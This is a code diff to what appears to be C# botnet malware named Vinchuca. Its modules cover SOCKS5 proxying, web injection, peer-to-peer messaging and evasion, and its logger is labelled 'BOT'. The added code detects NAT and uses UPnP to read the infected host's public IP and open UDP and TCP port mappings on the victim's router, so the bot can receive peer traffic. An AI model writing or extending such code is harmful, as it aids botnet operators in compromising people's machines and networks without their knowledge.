@@ -1,6 +1,8 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Net;
+using System.Net.Sockets;
 using Vinchuca.Actions.Socks5;
 using Vinchuca.Actions.WebInject;
 using Vinchuca.Network;
@@ -14,6 +16,8 @@ using Vinchuca.Network.Protocol.Messages.Command;
 using Vinchuca.Network.Protocol.Messages.System;
 using Vinchuca.Network.Protocol.Peers;
 using Vinchuca.System.Evation;
+using Vinchuca.Upnp;
+using Vinchuca.Utils;
 using Vinchuca.Workers;
 
 namespace Vinchuca
@@ -28,6 +32,7 @@ namespace Vinchuca
         private readonly MessageManager _messagesManager;
         private readonly Socks5Server _socks5;
         private readonly HttpsProxyServer _https;
+        public IPAddress PublicIP { get; set; }
 
         private static readonly Log Logger = new Log(new TraceSource("BOT", SourceLevels.Verbose));
 
@@ -53,9 +58,34 @@ namespace Vinchuca
             _peerList = new PeerList(_worker);
             _peerList.DesparadoModeActivated += DesperateModeActivated;
 
+
+            if (IPAddressUtils.BehingNAT())
+            {
+                var upnpSearcher = new UpnpSearcher();
+                upnpSearcher.DeviceFound += (s, e) =>
+                {
+                    PublicIP = e.Device.GetExternalIP();
+                    Logger.Verbose("External IP Address: {0}", PublicIP);
+                    try
+                    {
+                        e.Device.CreatePortMap(new Mapping(Protocol.Udp, port, BotIdentifier.Id.GetPort()));
+                        e.Device.CreatePortMap(new Mapping(Protocol.Tcp, port, 8009));
+                        e.Device.CreatePortMap(new Mapping(Protocol.Tcp, port, 8019));
+                    }
+                    catch (MappingException ex)
+                    {
+                        Logger.Warn("UPnp - port mapping failed: {0} - {1}", ex.ErrorCode, ex.ErrorText);
+                    }
+                    finally
+                    {
+                        upnpSearcher.Stop();
+                    }
+                };
+                upnpSearcher.Search();
+            }
+
             _listener = new MessageListener(port);
             _listener.UdpPacketReceived += EnqueueMessage;
-
             _communicationManager = new CommunicationManager(_listener, _worker);
             var peersManager = new PeerManager(_communicationManager, _peerList, _worker);
             _messagesManager = new MessageManager(peersManager);
